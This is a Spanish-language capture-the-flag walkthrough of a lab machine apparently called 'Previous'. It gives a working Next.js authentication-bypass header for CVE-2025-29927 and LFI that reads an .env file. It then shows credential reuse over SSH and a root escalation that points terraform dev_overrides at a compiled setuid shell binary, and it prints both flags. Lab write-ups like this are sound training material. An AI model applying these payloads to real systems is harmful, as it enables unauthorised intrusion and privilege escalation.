>Primero realizamos un escaneo de Nmap de los puertos TCP de la máquina víctima:

```bash
┌──(kali㉿jbkira)-[~/Desktop/machines/previous]
└─$ sudo nmap -p- -sS -Pn -n --open --min-rate 5000 -sV 10.10.11.83
Starting Nmap 7.95 ( https://nmap.org ) at 2025-10-27 07:11 EDT
Nmap scan report for 10.10.11.83
Host is up (0.066s latency).
Not shown: 60135 closed tcp ports (reset), 5398 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.13 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    nginx 1.18.0 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 21.57 seconds
```

>Agregamos los nombres de dominio encontrados en el escaneo al resolutor local para poder resolver sus nombres DNS:

```bash
┌──(kali㉿jbkira)-[~/Desktop/machines/previous]
└─$ echo "10.10.11.83 previous.htb" >> /etc/hosts
```

>Vemos un mail en el source code del sitio web principal:

<img width="807" height="72" alt="image" src="https://github.com/user-attachments/assets/b86f7f34-fbfe-48f6-97ae-6a4edae6b59c" />

>La página web está empleando una versión de NextJS vulnerable a Authentication Bypass (`CVE-2025-29927`):

<img width="1435" height="619" alt="image" src="https://github.com/user-attachments/assets/330c34c5-d29e-4f38-8e4f-f0f9b6084295" />

>Para explotarlo, deberemos ir a cualquier URL protegida por sesión e implementar el siguiente header en la solicitud HTTP:

```
X-Middleware-Subrequest: middleware:middleware:middleware:middleware:middleware
```

>Por ejemplo, capturaremos la solicitud al darle a **Getting Started** y le agregamos el header y vemos que hemos bypasseado la autenticación:

<img width="1461" height="369" alt="image" src="https://github.com/user-attachments/assets/2528a922-fa22-4d09-a688-13be48a3094d" />

>Encontramos un link con un query string interesante:

<img width="1431" height="513" alt="image" src="https://github.com/user-attachments/assets/10d6ac3f-7c2a-4922-9dfe-2654fd689cad" />

>Vemos que el query string **example** es vulnerable a LFI:

<img width="1157" height="435" alt="image" src="https://github.com/user-attachments/assets/439d005d-9b32-4eb4-aebd-1365b8cdb180" />

>Obtenemos el .env del NextJS:

<img width="1146" height="288" alt="image" src="https://github.com/user-attachments/assets/40f304a5-8b9e-4b07-88e1-9b654bd55bc3" />

>Encontramos una ruta crítica:

<img width="1360" height="408" alt="image" src="https://github.com/user-attachments/assets/20d1be9d-b40c-4efb-87c4-9cc272e7754f" />

>En esa ruta encontramos credenciales del usuario jeremy:  `jeremy:MyNameIsJeremyAndILovePancakes`

<img width="1469" height="400" alt="image" src="https://github.com/user-attachments/assets/8506b2e0-b95b-40e8-96a3-d12e953b3358" />

>Esas credenciales son reutilizadas para el usuario de ssh:

```bash
┌──(kali㉿jbkira)-[~/Desktop/machines/previous]
└─$ ssh jeremy@10.10.11.83                                         

<SNIP>

jeremy@previous:~$
```

>User flag:

```bash
jeremy@previous:~$ cat user.txt 
957bad664280e410c88aba305b3b46f9
```

>Vemos que puede usar como root el binario **terraform**:

```bash
jeremy@previous:~$ sudo -l
[sudo] password for jeremy: 
Matching Defaults entries for jeremy on previous:
    !env_reset, env_delete+=PATH, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty

User jeremy may run the following commands on previous:
    (root) /usr/bin/terraform -chdir\=/opt/examples apply
```

>Esta configuración usa **dev_overrides** para redirigir al provider previous.htb/terraform/examples para cargar desde una ruta local en vez de descargarlo del registro.

```bash
jeremy@previous:~$ cat .terraformrc 
provider_installation {
        dev_overrides {
                "previous.htb/terraform/examples" = "/usr/local/go/bin"
        }
        direct {}
}
```

>Lo cambiamos para que apunte a `/tmp`:

```bash
jeremy@previous:~$ cat .terraformrc 
provider_installation {
        dev_overrides {
                "previous.htb/terraform/examples" = "/tmp"
        }
        direct {}
}
```

>En /tmp vamos a crear un exploit que se va a ejecutar para spawnear una bash como root:

```C
// exploit.c
#include <unistd.h>
#include <stdio.h> 
int main() {
    setuid(0); setgid(0);
    execl("/bin/bash","bash","-p",NULL);
}
```

>Lo compilamos y le damos privilegios de ejecución:

```bash
jeremy@previous:/tmp$ gcc exploit.c -o terraform-provider-examples
jeremy@previous:/tmp$ chmod +x terraform-provider-examples 
```

>Lo ejecutamos aprovechando los permisos sudo, ganando una shell como root pudiendo ver la root flag:

```bash
jeremy@previous:/tmp$ sudo /usr/bin/terraform -chdir=/opt/examples apply
╷
│ Warning: Provider development overrides are in effect
│ 
│ The following provider development overrides are set in the CLI configuration:
│  - previous.htb/terraform/examples in /tmp
│ 
│ The behavior may therefore not match any released version of the provider and applying changes may cause the state to become incompatible with published releases.
╵
cp /bin/bash /tmp/bash && chmod u+s /tmp/bash
whoami
╷
│ Error: Failed to load plugin schemas
│ 
│ Error while loading schemas for plugin components: Failed to obtain provider schema: Could not load the schema for provider previous.htb/terraform/examples: failed to
│ instantiate provider "previous.htb/terraform/examples" to obtain schema: Unrecognized remote plugin message: root
│ This usually means
│   the plugin was not compiled for this architecture,
│   the plugin is missing dynamic-link libraries necessary to run,
│   the plugin is not executable by this process due to file permissions, or
│   the plugin failed to negotiate the initial go-plugin protocol handshake
│ 
│ Additional notes about plugin:
│   Path: /tmp/terraform-provider-examples
│   Mode: -rwxrwxr-x
│   Owner: 1000 [jeremy] (current: 0 [root])
│   Group: 1000 [jeremy] (current: 0 [root])
│   ELF architecture: EM_X86_64 (current architecture: amd64)
│ ..
╵
jeremy@previous:/tmp$ ls
bash                                                                            systemd-private-d3d83b4c0e6740ba819a5eeca5361b3b-systemd-resolved.service-399vAF
exploit.c                                                                       systemd-private-d3d83b4c0e6740ba819a5eeca5361b3b-systemd-timesyncd.service-EBQlJU
systemd-private-d3d83b4c0e6740ba819a5eeca5361b3b-fwupd.service-amlrRc           systemd-private-d3d83b4c0e6740ba819a5eeca5361b3b-upower.service-H6RxnL
systemd-private-d3d83b4c0e6740ba819a5eeca5361b3b-ModemManager.service-dDnBYq    terraform-provider-examples
systemd-private-d3d83b4c0e6740ba819a5eeca5361b3b-systemd-logind.service-cCcN7j  vmware-root_626-2697073973
jeremy@previous:/tmp$ ./bash -p
bash-5.1# whoami
root
bash-5.1# cat /root/root.txt
0c8a9f2ad4585b3f51e11745863c96ad
```
